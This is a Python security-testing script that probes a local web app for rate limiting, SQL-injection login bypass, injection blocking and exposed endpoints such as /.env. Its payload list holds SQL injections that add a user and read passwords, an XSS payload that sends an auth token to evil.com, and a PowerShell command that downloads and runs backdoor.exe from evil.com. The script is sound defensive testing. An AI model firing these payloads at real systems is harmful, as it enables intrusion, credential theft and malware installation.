"""
Penetration Testing - Advanced Security Assessment
"""
import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor

class PenetrationTester:
    def __init__(self, base_url="http://127.0.0.1:8000"):
        self.base_url = base_url
        self.token = None
        
    def login(self):
        """Get authentication token"""
        try:
            response = requests.post(f"{self.base_url}/auth/login", 
                                   json={"username": "admin", "password": "admin123"})
            if response.status_code == 200:
                self.token = response.json().get("access_token")
                return True
        except:
            pass
        return False
    
    def test_rate_limiting(self):
        """Test if system has rate limiting protection"""
        print("🔄 Testing Rate Limiting...")
        
        def make_request():
            try:
                headers = {"Authorization": f"Bearer {self.token}"} if self.token else {}
                response = requests.post(f"{self.base_url}/api/analyze", 
                                       json={"input": "test"}, headers=headers, timeout=5)
                return response.status_code
            except:
                return 0
        
        # Send 50 requests rapidly
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request) for _ in range(50)]
            results = [f.result() for f in futures]
        
        blocked_requests = sum(1 for r in results if r == 429)  # Too Many Requests
        
        if blocked_requests > 0:
            print(f"✅ Rate limiting active: {blocked_requests}/50 requests blocked")
            return True
        else:
            print("❌ No rate limiting detected - vulnerable to DDoS")
            return False
    
    def test_authentication_bypass(self):
        """Test authentication bypass attempts"""
        print("🔐 Testing Authentication Bypass...")
        
        bypass_attempts = [
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "' OR '1'='1' --", "password": "anything"},
            {"username": "admin'--", "password": ""},
            {"username": "admin", "password": "admin' OR '1'='1' /*"},
        ]
        
        bypassed = 0
        for attempt in bypass_attempts:
            try:
                response = requests.post(f"{self.base_url}/auth/login", json=attempt)
                if response.status_code == 200:
                    bypassed += 1
                    print(f"⚠️ Bypass successful: {attempt}")
            except:
                pass
        
        if bypassed == 0:
            print("✅ Authentication bypass protection active")
            return True
        else:
            print(f"❌ {bypassed} authentication bypasses successful")
            return False
    
    def test_injection_attacks(self):
        """Test various injection attacks"""
        print("💉 Testing Injection Attacks...")
        
        dangerous_payloads = [
            # High-risk SQL injections
            "'; EXEC xp_cmdshell('net user hacker pass123 /add'); --",
            "' UNION SELECT password FROM users WHERE username='admin'--",
            
            # High-risk XSS
            "<script>fetch('/api/stats',{headers:{'Authorization':'Bearer '+localStorage.getItem('authToken')}}).then(r=>r.json()).then(d=>fetch('http://evil.com/steal?data='+btoa(JSON.stringify(d))))</script>",
            
            # Command injection
            "; powershell -c \"Invoke-WebRequest -Uri http://evil.com/backdoor.exe -OutFile C:\\temp\\backdoor.exe; C:\\temp\\backdoor.exe\"",
        ]
        
        blocked = 0
        total = len(dangerous_payloads)
        
        for payload in dangerous_payloads:
            try:
                headers = {"Authorization": f"Bearer {self.token}"} if self.token else {}
                response = requests.post(f"{self.base_url}/api/analyze", 
                                       json={"input": payload}, headers=headers)
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("analysis", {}).get("blocked", False):
                        blocked += 1
                        print(f"🛡️ Blocked dangerous payload")
                    else:
                        print(f"❌ Dangerous payload not blocked: {payload[:50]}...")
            except:
                pass
        
        success_rate = (blocked / total) * 100
        print(f"📊 Injection protection: {success_rate:.1f}% ({blocked}/{total})")
        return success_rate > 80
    
    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        print("📄 Testing Information Disclosure...")
        
        info_requests = [
            "/api/stats",
            "/api/threats", 
            "/metrics",
            "/.env",
            "/config",
            "/admin",
        ]
        
        disclosed = 0
        for endpoint in info_requests:
            try:
                response = requests.get(f"{self.base_url}{endpoint}")
                if response.status_code == 200 and len(response.text) > 100:
                    disclosed += 1
                    print(f"⚠️ Information disclosed at: {endpoint}")
            except:
                pass
        
        if disclosed == 0:
            print("✅ No unauthorized information disclosure")
            return True
        else:
            print(f"❌ {disclosed} endpoints disclosing information")
            return False
    
    def run_penetration_test(self):
        """Run comprehensive penetration test"""
        print("🎯 PENETRATION TESTING SUITE")
        print("=" * 50)
        print("⚠️ WARNING: This will test real attack scenarios")
        print("=" * 50)
        
        # Login
        if not self.login():
            print("❌ Could not authenticate - some tests may fail")
        else:
            print("✅ Authentication successful")
        
        print("\n🚀 Running penetration tests...\n")
        
        # Run tests
        tests = [
            ("Rate Limiting", self.test_rate_limiting),
            ("Authentication Bypass", self.test_authentication_bypass), 
            ("Injection Attacks", self.test_injection_attacks),
            ("Information Disclosure", self.test_information_disclosure),
        ]
        
        results = {}
        for test_name, test_func in tests:
            print(f"\n--- {test_name} ---")
            results[test_name] = test_func()
        
        # Calculate overall security score
        passed_tests = sum(results.values())
        total_tests = len(results)
        security_score = (passed_tests / total_tests) * 100
        
        print("\n" + "=" * 50)
        print("🔍 PENETRATION TEST RESULTS")
        print("=" * 50)
        
        for test_name, passed in results.items():
            status = "✅ PASS" if passed else "❌ FAIL"
            print(f"{test_name}: {status}")
        
        print(f"\n🏆 Overall Security Score: {security_score:.1f}%")
        
        if security_score >= 75:
            print("✅ System shows good security posture")
        elif security_score >= 50:
            print("⚠️ System has moderate security - improvements needed")
        else:
            print("🔴 System has poor security - immediate action required")
        
        return security_score

if __name__ == "__main__":
    tester = PenetrationTester()
    tester.run_penetration_test()